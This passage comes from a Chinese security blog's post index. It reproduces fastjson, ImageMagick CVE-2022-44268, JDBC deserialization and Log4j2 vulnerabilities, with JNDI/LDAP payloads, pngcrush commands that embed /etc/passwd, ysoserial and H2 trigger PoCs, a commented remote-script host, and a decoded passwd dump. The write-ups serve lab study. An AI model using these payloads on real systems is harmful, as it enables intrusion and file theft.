class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;/dependencies&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;properties&gt;</span><br><span class=\"line\">        &lt;project.build.sourceEncoding&gt;UTF-<span class=\"number\">8</span>&lt;/project.build.sourceEncoding&gt;</span><br><span class=\"line\">        &lt;maven.compiler.encoding&gt;UTF-<span class=\"number\">8</span>&lt;/maven.compiler.encoding&gt;</span><br><span class=\"line\">        &lt;java.version&gt;<span class=\"number\">1.8</span>&lt;/java.version&gt;</span><br><span class=\"line\">        &lt;maven.compiler.source&gt;<span class=\"number\">1.8</span>&lt;/maven.compiler.source&gt;</span><br><span class=\"line\">        &lt;maven.compiler.target&gt;<span class=\"number\">1.8</span>&lt;/maven.compiler.target&gt;</span><br><span class=\"line\">    &lt;/properties&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/project&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n\n<p>fastjson 1.2.66 -</p>\n<p>和1.2.62类似，在开启AutoType的情况下，由于黑名单过滤不全而导致的绕过问题</p>\n<p>{“@type”:”org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup”,”jndiNames”:”ldap:&#x2F;&#x2F;x.x.x.x&#x2F;Exp”}</p>\n","categories":["漏洞复现"],"tags":["漏洞复现","反序列化","Fasjson","不出网"]},{"title":"ImageMagick任意文件读取漏洞 (CVE-2022-44268)","url":"/2023/02/22/ImageMagick%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20(CVE-2022-44268)/","content":"<h1 id=\"ImageMagick任意文件读取漏洞-CVE-2022-44268\"><a href=\"#ImageMagick任意文件读取漏洞-CVE-2022-44268\" class=\"headerlink\" title=\"ImageMagick任意文件读取漏洞 (CVE-2022-44268)\"></a>ImageMagick任意文件读取漏洞 (CVE-2022-44268)</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><p>ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。</p>\n<h2 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">ImageMagick <span class=\"number\">7.1</span>.x &lt;= <span class=\"number\">7.1</span><span class=\"number\">.0</span>-<span class=\"number\">51</span></span><br><span class=\"line\">ImageMagick <span class=\"number\">7.0</span>.x</span><br><span class=\"line\">ImageMagick <span class=\"number\">6.9</span>.x</span><br><span class=\"line\">ImageMagick <span class=\"number\">6.8</span><span class=\"number\">.3</span>-<span class=\"number\">10</span> &lt;= <span class=\"number\">6.8</span>.x &lt;= <span class=\"number\">6.8</span><span class=\"number\">.9</span>-<span class=\"number\">10</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"环境部署\"><a href=\"#环境部署\" class=\"headerlink\" title=\"环境部署\"></a>环境部署</h2><p><strong>imagemagick及其依赖环境安装：</strong></p>\n<p>我这边是直接在centos里面安装了这个环境的，命令如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum -y install ImageMagick pngcrush exiftool exiv2 -y</span><br></pre></td></tr></table></figure>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p><strong>生成恶意图片文件</strong></p>\n<p>可选择任意png文件，使用pngcrush对其进行编辑生成，默认生成文件为pngout.png</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">pngcrush -text a <span class=\"string\">&quot;profile&quot;</span> <span class=\"string\">&quot;/etc/passwd&quot;</span> exp.png</span><br></pre></td></tr></table></figure>\n<p>或者使用脚本</p>\n<p><a href=\"https://codeload.github.com/Sybil-Scan/imagemagick-lfi-poc/zip/refs/heads/main\">https://codeload.github.com/Sybil-Scan/imagemagick-lfi-poc/zip/refs/heads/main</a></p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">python3 generate.py -f &quot;/etc/passwd&quot; -o exploit.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"f-ese1LhLLFdBw0AWb-6gQevjjIFgZ53ahYNuBm1TOg.png\" alt=\"image\"></p>\n<p><strong>验证生成文件</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">exiv2 -pS exp.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"KgELFLLhuDYbM_cg6fs43HuhfrlEQpAgISgDN9JAwO0.png\" alt=\"image\"></p>\n<p><strong>执行convert，调用ImagemMagic对图片进行编辑</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">convert exp.png haha6.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"WcRJPYlNXNNnLRuiCpF-aHgq6jiAzojD1ebbFcAhEIk.png\" alt=\"image\"></p>\n<p><strong>读取生成图片内容</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">identify -verbose haha6.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"Fo-5o5IfS7UrV7zkugPZZw8psf4h0SjVMBw8MqzpzhI.png\" alt=\"image\"></p>\n<p><img src=\"Yu95gJsykkPmi8nbDP6EvI9vQzQJ5y3Ss3MWAaYxgW8.png\" alt=\"image\"></p>\n<p>python解码示例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(bytes.fromhex(text).decode(<span class=\"string\">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(bytes.fromhex(<span class=\"string\">&quot;726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a62696e3a783a313a313a62696e3a2f62696e3a2f7362696e2f6e6f6c6f67696e0a6461656d6f6e3a783a323a323a6461656d6f6e3a2f7362696e3a2f7362696e2f6e6f6c6f67696e0a61646d3a783a333a343a61646d3a2f7661722f61646d3a2f7362696e2f6e6f6c6f67696e0a6c703a783a343a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7362696e2f6e6f6c6f67696e0a73796e633a783a353a303a73796e633a2f7362696e3a2f62696e2f73796e630a73687574646f776e3a783a363a303a73687574646f776e3a2f7362696e3a2f7362696e2f73687574646f776e0a68616c743a783a373a303a68616c743a2f7362696e3a2f7362696e2f68616c740a6d61696c3a783a383a31323a6d61696c3a2f7661722f73706f6f6c2f6d61696c3a2f7362696e2f6e6f6c6f67696e0a6f70657261746f723a783a31313a303a6f70657261746f723a2f726f6f743a2f7362696e2f6e6f6c6f67696e0a67616d65733a783a31323a3130303a67616d65733a2f7573722f67616d65733a2f7362696e2f6e6f6c6f67696e0a6674703a783a31343a35303a46545020557365723a2f7661722f6674703a2f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a39393a39393a4e6f626f64793a2f3a2f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3139323a3139323a73797374656d64204e6574776f726b204d616e6167656d656e743a2f3a2f7362696e2f6e6f6c6f67696e0a646275733a783a38313a38313a53797374656d206d657373616765206275733a2f3a2f7362696e2f6e6f6c6f67696e0a706f6c6b6974643a783a3939393a3939383a5573657220666f7220706f6c6b6974643a2f3a2f7362696e2f6e6f6c6f67696e0a737373643a783a3939383a3939363a5573657220666f7220737373643a2f3a2f7362696e2f6e6f6c6f67696e0a6c696273746f726167656d676d743a783a3939373a3939343a6461656d6f6e206163636f756e7420666f72206c696273746f726167656d676d743a2f7661722f72756e2f6c736d3a2f7362696e2f6e6f6c6f67696e0a7270633a783a33323a33323a52706362696e64204461656d6f6e3a2f7661722f6c69622f72706362696e643a2f7362696e2f6e6f6c6f67696e0a636f6c6f72643a783a3939363a3939333a5573657220666f7220636f6c6f72643a2f7661722f6c69622f636f6c6f72643a2f7362696e2f6e6f6c6f67696e0a676c75737465723a783a3939353a3939323a476c75737465724653206461656d6f6e733a2f7661722f72756e2f676c75737465723a2f7362696e2f6e6f6c6f67696e0a7361736c617574683a783a3939343a37363a5361736c617574686420757365723a2f72756e2f7361736c61757468643a2f7362696e2f6e6f6c6f67696e0a616272743a783a3137333a3137333a3a2f6574632f616272743a2f7362696e2f6e6f6c6f67696e0a736574726f75626c6573686f6f743a783a3939333a3939303a3a2f7661722f6c69622f736574726f75626c6573686f6f743a2f7362696e2f6e6f6c6f67696e0a72746b69743a783a3137323a3137323a5265616c74696d654b69743a2f70726f633a2f7362696e2f6e6f6c6f67696e0a70756c73653a783a3137313a3137313a50756c7365417564696f2053797374656d204461656d6f6e3a2f7661722f72756e2f70756c73653a2f7362696e2f6e6f6c6f67696e0a6368726f6e793a783a3939323a3938373a3a2f7661722f6c69622f6368726f6e793a2f7362696e2f6e6f6c6f67696e0a727063757365723a783a32393a32393a525043205365727669636520557365723a2f7661722f6c69622f6e66733a2f7362696e2f6e6f6c6f67696e0a6e66736e6f626f64793a783a36353533343a36353533343a416e6f6e796d6f7573204e465320557365723a2f7661722f6c69622f6e66733a2f7362696e2f6e6f6c6f67696e0a756e626f756e643a783a3939313a3938363a556e626f756e6420444e53207265736f6c7665723a2f6574632f756e626f756e643a2f7362696e2f6e6f6c6f67696e0a7473733a783a35393a35393a4163636f756e742075736564206279207468652074726f7573657273207061636b61676520746f2073616e64626f78207468652074637364206461656d6f6e3a2f6465762f6e756c6c3a2f7362696e2f6e6f6c6f67696e0a7573626d7578643a783a3131333a3131333a7573626d75786420757365723a2f3a2f7362696e2f6e6f6c6f67696e0a67656f636c75653a783a3939303a3938343a5573657220666f722067656f636c75653a2f7661722f6c69622f67656f636c75653a2f7362696e2f6e6f6c6f67696e0a72616476643a783a37353a37353a726164766420757365723a2f3a2f7362696e2f6e6f6c6f67696e0a71656d753a783a3130373a3130373a71656d7520757365723a2f3a2f7362696e2f6e6f6c6f67696e0a6e74703a783a33383a33383a3a2f6574632f6e74703a2f7362696e2f6e6f6c6f67696e0a67646d3a783a34323a34323a3a2f7661722f6c69622f67646d3a2f7362696e2f6e6f6c6f67696e0a676e6f6d652d696e697469616c2d73657475703a783a3938393a3938333a3a2f72756e2f676e6f6d652d696e697469616c2d73657475702f3a2f7362696e2f6e6f6c6f67696e0a737368643a783a37343a37343a50726976696c6567652d736570617261746564205353483a2f7661722f656d7074792f737368643a2f7362696e2f6e6f6c6f67696e0a61766168693a783a37303a37303a4176616869206d444e532f444e532d534420537461636b3a2f7661722f72756e2f61766168692d6461656d6f6e3a2f7362696e2f6e6f6c6f67696e0a706f73746669783a783a38393a38393a3a2f7661722f73706f6f6c2f706f73746669783a2f7362696e2f6e6f6c6f67696e0a74637064756d703a783a37323a37323a3a2f3a2f7362696e2f6e6f6c6f67696e0a7a68696e616e3a783a313030303a313030303a7a68696e616e3a2f686f6d652f7a68696e616e3a2f62696e2f626173680a73616e65643a783a3938383a3938323a53414e45207363616e6e6572206461656d6f6e20757365723a2f7573722f73686172652f73616e653a2f7362696e2f6e6f6c6f67696e0a&quot;</span>).decode(<span class=\"string\">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>\n<p><img src=\"rI5sRPsJaJJGMz4NZ1bkCQhjmLgjOVMNoYaxIhigNzY.png\" alt=\"image\"></p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>参考：<a href=\"https://www.metabaseq.com/imagemagick-zero-days/\">https://www.metabaseq.com/imagemagick-zero-days/</a> </p>\n<p>这里以ImageMagick-7.1.0-50为例</p>\n<p>下载地址：<a href=\"https://github.com/ImageMagick/ImageMagick/releases?page=3\">https://github.com/ImageMagick/ImageMagick/releases?page=3</a></p>\n<p>读取PNG文件</p>\n<p>coders&#x2F;png.c:2164的ReadOnePNGImage</p>\n<p><img src=\"9sBp92IEFRqxjQ8m6OknRJT_vxiawLYajMeB92lCtOk.png\" alt=\"image\"></p>\n<p>读取tEXt的过程当中会调用到SetImageProperty()</p>\n<p><img src=\"vtNgJlbyW1oTVDyugyLC8XNuQUZRVC52HZ9AlOmfqlM.png\" alt=\"image\"></p>\n<p>SetImageProperty()在于MagickCore&#x2F;property.c:4360</p>\n<p><img src=\"Jqu1VvLsz3Vo8ymIDkDsH_T6gGkHTTWS4b0BHPPQ2O0.png\" alt=\"image\"></p>\n<p>在SetImageProperty()中，如果匹配到profile就进行文件读取，再将其重新赋值。（MagickCore&#x2F;property.c:4723）</p>\n<p><img src=\"WpjfH9aNHmJBSrS9LcAD86GXYzFwOqDfqO2QlYslS0o.png\" alt=\"image\"></p>\n<p>读取成功之后就写入到新的png文件中。攻击者下载该图片，即可获取到内容。</p>\n<p>思路整理：</p>\n<ul>\n<li>攻击者向PNG图片添加的文本块中包含profile“关键字”和“文本字符串”</li>\n<li>ImageMagick把文本字符串做为文件路径去读取文件</li>\n<li>文件内容以HEX形式嵌入新生成的PNG图片</li>\n<li>攻击者下载新的PNG图片</li>\n</ul>\n","categories":["漏洞复现"],"tags":["漏洞复现"]},{"title":"JDBC反序列化漏洞简单利用","url":"/2022/12/15/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/","content":"<h2 id=\"JDBC反序列化漏洞简单利用\"><a href=\"#JDBC反序列化漏洞简单利用\" class=\"headerlink\" title=\"JDBC反序列化漏洞简单利用\"></a>JDBC反序列化漏洞简单利用</h2><p>创建一个maven的项目</p>\n<p>启动一个恶意的MySQL</p>\n<p>python2 rogue_mysql_server.py</p>\n<p><img src=\"Cw3kbcGYMzdsw1laSeevFZeDvm3k0nVaDd5fyxTLOEQ.png\" alt=\"image\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">package poc;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.Connection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.DriverManager;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.SQLException;</span><br><span class=\"line\"></span><br><span class=\"line\">public <span class=\"keyword\">class</span> <span class=\"title class_\">TestJDBC</span> &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;</span><br><span class=\"line\">        Class.forName(<span class=\"string\">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class=\"line\">        String url = <span class=\"string\">&quot;jdbc:mysql://127.0.0.1:3306/mysql?useSSL=false&amp;allowLoadLocalInfile=true&amp;maxAllowedPacket=65535&quot;</span>;</span><br><span class=\"line\">        Connection conn = DriverManager.getConnection(url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"_tspeQii5wXIZ12a3GrKaAeTaBf0iloEPHNmoQJUiV0.png\" alt=\"image\"></p>\n<p>弹计算器1：</p>\n<p>python37 server.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;config&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;ysoserialPath&quot;</span>:<span class=\"string\">&quot;ysoserial-0.0.6-SNAPSHOT-all.jar&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;javaBinPath&quot;</span>:<span class=\"string\">&quot;java&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;fileOutputDir&quot;</span>:<span class=\"string\">&quot;./fileOutput/&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;displayFileContentOnScreen&quot;</span>:true,</span><br><span class=\"line\">        <span class=\"string\">&quot;saveToFile&quot;</span>:true</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;fileread&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;win_ini&quot;</span>:<span class=\"string\">&quot;c:\\\\windows\\\\win.ini&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;win_hosts&quot;</span>:<span class=\"string\">&quot;c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;win&quot;</span>:<span class=\"string\">&quot;c:\\\\windows\\\\&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;linux_passwd&quot;</span>:<span class=\"string\">&quot;/etc/passwd&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;linux_hosts&quot;</span>:<span class=\"string\">&quot;/etc/hosts&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;index_php&quot;</span>:<span class=\"string\">&quot;index.php&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;ssrf&quot;</span>:<span class=\"string\">&quot;https://www.baidu.com/&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;__defaultFiles&quot;</span>:[<span class=\"string\">&quot;/etc/hosts&quot;</span>,<span class=\"string\">&quot;c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts&quot;</span>]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;yso&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;Jdk7u21&quot;</span>:[<span class=\"string\">&quot;Jdk7u21&quot;</span>,<span class=\"string\">&quot;calc&quot;</span>]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>poc</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">package poc;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.Connection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.DriverManager;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.SQLException;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public <span class=\"keyword\">class</span> <span class=\"title class_\">Test2</span> &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;</span><br><span class=\"line\">        Class.forName(<span class=\"string\">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class=\"line\">        String url = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">//        url = <span class=\"string\">&quot;jdbc:mysql://localhost:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;maxAllowedPacket=65535&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span> +</span><br><span class=\"line\">//                <span class=\"string\">&quot;&amp;user=yso_URLDNS_http://blqr5c.dnslog.cn/&quot;</span>;</span><br><span class=\"line\">        url = <span class=\"string\">&quot;jdbc:mysql://localhost:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;maxAllowedPacket=65535&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;&amp;user=yso_CommonsCollections6_calc&quot;</span>;</span><br><span class=\"line\">        Connection conn = DriverManager.getConnection(url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"p_ayYGcietaoOPFgPzRUG0EteXMxeuHbtJzbjvnW8Wo.png\" alt=\"image\"></p>\n<p>弹计算器2：</p>\n<p>python37 server.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;config&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;ysoserialPath&quot;</span>:<span class=\"string\">&quot;ysoserial-0.0.6-SNAPSHOT-all.jar&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;javaBinPath&quot;</span>:<span class=\"string\">&quot;java&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;fileOutputDir&quot;</span>:<span class=\"string\">&quot;./fileOutput/&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;displayFileContentOnScreen&quot;</span>:true,</span><br><span class=\"line\">        <span class=\"string\">&quot;saveToFile&quot;</span>:true</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;fileread&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;win_ini&quot;</span>:<span class=\"string\">&quot;c:\\\\windows\\\\win.ini&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;win_hosts&quot;</span>:<span class=\"string\">&quot;c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;win&quot;</span>:<span class=\"string\">&quot;c:\\\\windows\\\\&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;linux_passwd&quot;</span>:<span class=\"string\">&quot;/etc/passwd&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;linux_hosts&quot;</span>:<span class=\"string\">&quot;/etc/hosts&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;index_php&quot;</span>:<span class=\"string\">&quot;index.php&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;ssrf&quot;</span>:<span class=\"string\">&quot;https://www.baidu.com/&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;__defaultFiles&quot;</span>:[<span class=\"string\">&quot;/etc/hosts&quot;</span>,<span class=\"string\">&quot;c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts&quot;</span>]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;yso&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;Jdk7u21&quot;</span>:[<span class=\"string\">&quot;Jdk7u21&quot;</span>,<span class=\"string\">&quot;calc&quot;</span>]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">package poc;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.Connection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.DriverManager;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.SQLException;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public <span class=\"keyword\">class</span> <span class=\"title class_\">test3</span> &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;</span><br><span class=\"line\">        Class.forName(<span class=\"string\">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class=\"line\">        String url = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        url = <span class=\"string\">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;$$\\n&quot;</span>;</span><br><span class=\"line\">        //url = <span class=\"string\">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=RUNSCRIPT FROM &#x27;http://evil1.dnslog.ceye.io/h2.sql&#x27;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        Connection conn = DriverManager.getConnection(url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"lXiTGSfzOaN2woWTsJ-Bf4JIVm5dh4WovkQDDOOCO8s.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","反序列化","JDBC"]},{"title":"Log4j2 RCE windows本地复现","url":"/2022/12/11/Log4j2%20RCE%20windows%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/","content":"<h1 id=\"Log4j2-RCE-windows本地复现\"><a href=\"#Log4j2-RCE-windows本地复现\" class=\"headerlink\" title=\"Log4j2 RCE windows本地复现\"></a>Log4j2 RCE windows本地复现</h1><p>注意：先确认该JDK是否默认支持运行jndi</p>\n<p>漏洞刚出不久，影响范围巨大，虽然忙着给公司资产排查漏洞，同时在此进行简单的漏洞复现。</p>\n<p>1.创建一个恶意的类，这里创建一个弹出计算器的类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Exploit</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Exploit</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 要执行的命令</span></span><br><span class=\"line\">            String[] commands = &#123;<span class=\"string\">&quot;calc.exe&quot;</span>&#125;;</span><br><span class=\"line\">            <span class=\"type\">Process</span> <span class=\"variable\">pc</span> <span class=\"operator\">=</span> Runtime.getRuntime().exec(commands);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] argv)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Exploit</span> <span class=\"variable\">e</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Exploit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>MAC系统的恶意类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Exploit</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Exploit</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 要执行的命令</span></span><br><span class=\"line\">            String[] commands = &#123;<span class=\"string\">&quot;open&quot;</span>, <span class=\"string\">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class=\"line\">            <span class=\"type\">Process</span> <span class=\"variable\">pc</span> <span class=\"operator\">=</span> Runtime.getRuntime().exec(commands);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] argv)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Exploit</span> <span class=\"variable\">e</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Exploit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>2.编译成class类之后运行</p>\n<p>java Exploit</p>\n<p><img src=\"05d8f9b7-19d7-487c-b437-7dcf20f2214f.jpg\" alt=\"image\"></p>\n<p>3.创建一个log4j的类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.logging.log4j.LogManager;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.logging.log4j.Logger;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">log4j</span> &#123;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Logger</span> <span class=\"variable\">logger</span> <span class=\"operator\">=</span> LogManager.getLogger(log4j.class);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">logger.error(<span class=\"string\">&quot;$&#123;jndi:ldap://127.0.0.1:1389/a&#125;&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>4.尝试运行，但是发现报错了</p>\n<p><img 